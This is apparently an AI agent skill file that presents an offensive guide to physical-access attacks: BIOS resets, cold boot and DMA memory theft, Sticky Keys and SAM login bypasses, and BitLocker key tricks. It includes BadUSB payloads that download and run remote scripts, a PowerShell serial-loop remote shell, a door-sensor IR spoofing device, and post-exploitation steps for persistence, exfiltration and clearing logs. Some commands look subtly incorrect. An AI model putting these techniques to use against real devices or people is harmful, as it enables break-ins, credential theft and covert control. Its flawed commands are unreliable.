---
name: hardware-physical-access
description: Physical security testing and hardware attack techniques. Use this skill whenever the user mentions physical access, BIOS/UEFI password recovery, hardware security testing, cold boot attacks, DMA attacks, BadUSB/HID implants, BitLocker bypass, chassis intrusion switches, or IR sensor bypass. Trigger for any physical penetration testing scenario, hardware forensics, or security assessment involving direct device access.
---

# Hardware Physical Access Attacks

A comprehensive guide for physical security testing and hardware-based attack techniques. This skill covers BIOS/UEFI manipulation, memory attacks, HID implants, and physical bypass methods.

## When to Use This Skill

Use this skill when:
- Testing physical security controls on devices
- Recovering or bypassing BIOS/UEFI passwords
- Performing hardware-based penetration testing
- Analyzing memory dumps or cold boot scenarios
- Working with HID/BadUSB implants
- Bypassing BitLocker or other disk encryption
- Exploiting physical device vulnerabilities
- Conducting security assessments with physical access

## BIOS/UEFI Password Recovery

### Method 1: Hardware Reset

**CMOS Battery Removal:**
1. Power off the device and disconnect all power sources
2. Open the chassis to access the motherboard
3. Locate the CMOS battery (typically CR2032 coin cell)
4. Remove the battery and wait 30 minutes
5. Reinstall the battery and power on
6. BIOS settings including passwords will be reset to defaults

**Jumper Reset:**
1. Locate the CMOS clear jumper on the motherboard (often labeled CLR_CMOS, CLEAR, or JBAT1)
2. Move the jumper from pins 1-2 to pins 2-3
3. Power on briefly, then power off
4. Return jumper to original position (1-2)
5. BIOS will be reset

### Method 2: Software Tools

**From Live CD/USB (Kali Linux):**

```bash
# Install required tools
sudo apt install killcmos cmospwd

# Attempt BIOS password recovery
sudo killcmos
# or
sudo cmospwd
```

**Error Code Method:**
1. Enter incorrect BIOS password 3 times
2. Note the error code displayed
3. Use https://bios-pw.org to calculate the master password
4. Enter the calculated password to gain access

### Method 3: UEFI Security Analysis

**Using chipsec:**

```bash
# Install chipsec
pip install chipsec

# Analyze UEFI settings
sudo python3 chipsec_main.py -i

# Disable Secure Boot (if vulnerable)
sudo python3 chipsec_main.py -module exploits.secure.boot.pk

# Check for firmware vulnerabilities
sudo python3 chipsec_main.py -module firmware
```

## RAM Analysis and Cold Boot Attacks

### Memory Persistence

RAM retains data for 1-2 minutes after power loss. This can be extended to 10+ minutes with cooling.

### Cold Boot Attack Procedure

1. **Prepare the system:**
   - Ensure target system is running with sensitive data in memory
   - Have a bootable USB with memory dump tools ready

2. **Cool the RAM (optional but recommended):**
   - Use compressed air or liquid nitrogen
   - Apply cooling to RAM modules while system is running
   - This extends data retention time

3. **Create memory dump:**
   ```bash
   # Force reboot into memory dump mode
   # On Windows: Ctrl+Alt+Del → Restart while holding Shift
   # On Linux: Use magic SysRq key (Alt+SysRq+b)
   
   # Boot from Live USB and dump memory
   sudo dd if=/dev/mem of=/root/memory.dump bs=1M
   # or
   sudo dd if=/dev/ram0 of=/root/memory.dump bs=1M
   ```

4. **Analyze the dump:**
   ```bash
   # Install Volatility
   pip install volatility
   
   # Identify OS and profile
   volatility -f memory.dump imageinfo
   
   # Extract passwords and credentials
   volatility -f memory.dump --profile=Win10x64 hashdump
   volatility -f memory.dump --profile=Win10x64 credentials
   ```

## Direct Memory Access (DMA) Attacks

### INCEPTION Tool

INCEPTION enables physical memory manipulation through DMA interfaces:

**Compatible Interfaces:**
- FireWire (IEEE 1394)
- Thunderbolt
- ExpressCard
- PCMCIA

**Attack Procedure:**

```bash
# Clone and build INCEPTION
git clone https://github.com/SecurityInnovation/INCEPTION.git
cd INCEPTION
make

# Execute attack (requires physical DMA access)
./inception --target <device>
```

**Capabilities:**
- Bypass login by patching memory
- Inject arbitrary code
- Extract encryption keys
- Modify running processes

**Limitations:**
- Ineffective against Windows 10+ with DMA protection
- Requires physical access to DMA-capable ports
- May trigger security alerts

## Live CD/USB System Access

### Windows Binary Replacement

**Replace sethc.exe (Sticky Keys):**

```bash
# Boot from Live USB
# Mount Windows partition
sudo mount /dev/sdXY /mnt

# Backup original
sudo cp /mnt/windows/system32/sethc.exe /mnt/windows/system32/sethc.exe.bak

# Replace with cmd.exe
sudo cp /mnt/windows/system32/cmd.exe /mnt/windows/system32/sethc.exe

# Set permissions
sudo chown root:root /mnt/windows/system32/sethc.exe
```

**Replace Utilman.exe (Ease of Access):**

```bash
sudo cp /mnt/windows/system32/cmd.exe /mnt/windows/system32/utilman.exe
```

**Usage:** After reboot, press Shift 5 times (sethc) or click Ease of Access icon to get SYSTEM-level command prompt.

### SAM File Manipulation

**Using chntpw:**

```bash
# Install chntpw
sudo apt install chntpw

# Edit SAM file
sudo chntpw -i /mnt/windows/system32/config/SAM

# Options:
# 1) List users
# 2) Unlock user account
# 3) Change password
# 4) Add user to administrators
# 5) Clear password
```

### Kon-Boot

Kon-Boot bypasses Windows login without modifying system files:

```bash
# Download from https://www.raymond.cc
# Boot from Kon-Boot USB
# Select target Windows installation
# Login with any password (will be ignored)
```

## Windows Security Bypasses

### Boot Shortcuts

| Key | Function |
|-----|----------|
| F2/F10/Supr | Access BIOS/UEFI settings |
| F8 | Enter Recovery/Advanced Boot mode |
| Shift (after Windows logo) | Bypass autologon |
| Ctrl+Alt+Del | Security options menu |

### Volume Shadow Copy

Extract SAM file from shadow copies:

```powershell
# List shadow copies
vssadmin list shadows

# Mount and copy SAM
mountvol S: /S
xcopy S:\$WINDOWS.~BT\Sources\SAM C:\temp\SAM
```

## BadUSB / HID Implant Techniques

### ESP32-S3 Cable Implants

**Evil Crow Cable Wind Setup:**

1. **Initial Configuration:**
   - Connect cable to victim host for power
   - Create Wi-Fi hotspot: `Evil Crow Cable Wind` / `123456789`
   - Access web interface: http://cable-wind.local/

2. **Web Interface Features:**
   - Payload Editor: Create custom HID scripts
   - Upload Payload: Load pre-made payloads
   - AutoExec: Configure automatic execution on connect
   - Remote Shell: Access via Wi-Fi TCP
   - Config: Adjust VID/PID, keyboard layout

3. **Firmware Update:**
   ```bash
   # Update firmware over HTTP
   curl -F "file=@new_firmware.ino.bin" http://cable-wind.local/update
   ```

### OS-Aware AutoExec Payloads

**Windows PowerShell Download:**

```
GUI r
STRING powershell.exe
ENTER
STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"
ENTER
```

**macOS/Linux Shell Download:**

```
COMMAND SPACE  # macOS Spotlight
STRING curl -fsSL http://10.0.0.1/init.sh | bash
ENTER
```

**Linux Alternative:**

```
CTRL ALT T  # Open terminal
STRING curl -fsSL http://10.0.0.1/init.sh | bash
ENTER
```

### HID-Bootstrapped Remote Shell

**Windows Serial Loop:**

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open()
while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

**Operation:**
1. Implant executes payload to open serial listener
2. Operator connects via Wi-Fi TCP to implant
3. Commands sent over TCP are forwarded to serial
4. Serial loop executes commands on target
5. Output limited - use blind commands

## BitLocker Bypass Techniques

### Memory Dump Recovery

**Extract Recovery Key from MEMORY.DMP:**

```bash
# Tools required:
# - Elcomsoft Forensic Disk Decryptor
# - Passware Kit Forensic

# Process memory dump
elcomsoft-fdd -i memory.dump -o recovery_keys.txt
```

### Social Engineering Recovery Key

Add a new recovery key with all zeros:

```powershell
# Convince user to run:
manage-bde -protectors -add C: -RecoveryPassword
# When prompted, enter: 00000000000000000000000000000000
```

## Chassis Intrusion Switch Exploitation

### Framework 13 Example

**Reset Pattern:**
```
1. Power on device (EC must be running)
2. Remove bottom cover to access intrusion switch
3. Press and hold switch for 2 seconds
4. Release and wait 2 seconds
5. Repeat cycle 10 times total
6. Reassemble and reboot
7. BIOS NVRAM will be wiped
```

**Total time:** ~40 seconds
**Tools required:** Screwdriver only

### Generic Exploitation

1. Research vendor-specific reset patterns (forums, documentation)
2. Power on target to activate EC
3. Access intrusion/maintenance switch
4. Execute vendor-specific toggle pattern
5. Reboot - firmware protections cleared
6. Boot Live USB for post-exploitation

### Detection & Mitigation

**For Defenders:**
- Monitor chassis-intrusion events in management console
- Apply tamper-evident seals on screws/covers
- Keep devices in physically controlled areas
- Disable maintenance switch reset features where possible
- Require cryptographic authorization for NVRAM resets

## IR Sensor Bypass

### No-Touch Exit Sensor Attack

**Sensor Characteristics:**
- Near-IR LED emitter with TV-remote style receiver
- Requires 4-10 pulses at ~30 kHz carrier
- Plastic shroud prevents direct emitter-receiver view
- Controller assumes validated carrier = nearby reflection

**Attack Workflow:**

1. **Capture Emission Profile:**
   - Connect logic analyzer to controller pins
   - Record pre-detection and post-detection waveforms
   - Identify carrier frequency and pulse pattern

2. **Replay Post-Detection Waveform:**
   - Remove/ignore stock emitter
   - Drive external IR LED with triggered pattern
   - Receiver accepts spoofed carrier as genuine

3. **Gate Transmission:**
   - Transmit in tuned bursts (tens of ms on/off)
   - Deliver minimum pulse count
   - Avoid saturating receiver AGC

### Long-Range Reflective Injection

**Setup:**
- High-power IR diode with MOSFET driver
- Focusing optics for beam control
- Range: ~6 meters with reflection

**Technique:**
- Aim at interior walls/shelving visible through glass
- Reflected energy enters ~30° receiver field of view
- Stronger external beam bounces multiple surfaces
- No line-of-sight to receiver aperture required

### Weaponized Flashlight

**Components:**
- Commercial flashlight housing
- High-power IR LED (matched to receiver band)
- ATtiny412 microcontroller
- MOSFET driver
- Telescopic zoom lens
- Vibration motor for haptic feedback

**Operation:**
- Cycle through stored modulation patterns
- Sweep reflective surfaces
- Listen for relay click (door release)
- Haptic feedback confirms active modulation

## Post-Exploitation Checklist

After gaining physical access:

1. **Credential Harvesting:**
   - Dump SAM file
   - Extract browser passwords
   - Capture saved Wi-Fi credentials
   - Check for cached credentials

2. **Persistence:**
   - Create hidden user accounts
   - Install backdoor services
   - Modify boot configuration
   - Deploy hardware implants

3. **Data Exfiltration:**
   - Copy sensitive files to USB
   - Set up remote access
   - Configure data staging
   - Establish C2 channels

4. **Cover Tracks:**
   - Clear event logs
   - Remove evidence of access
   - Restore modified files
   - Document for reporting

## Safety and Legal Considerations

**Always:**
- Obtain written authorization before testing
- Document all actions taken
- Work within scope of engagement
- Report findings responsibly
- Follow applicable laws and regulations

**Never:**
- Test systems without permission
- Steal or exfiltrate data
- Cause damage to hardware
- Violate privacy or confidentiality
- Use techniques for malicious purposes

## References

- [Pentest Partners – Framework 13 Reset](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – IR Sensor Bypass](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – Evil Crow Cable Wind](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [BIOS Password Calculator](https://bios-pw.org)
- [Kon-Boot Documentation](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/)
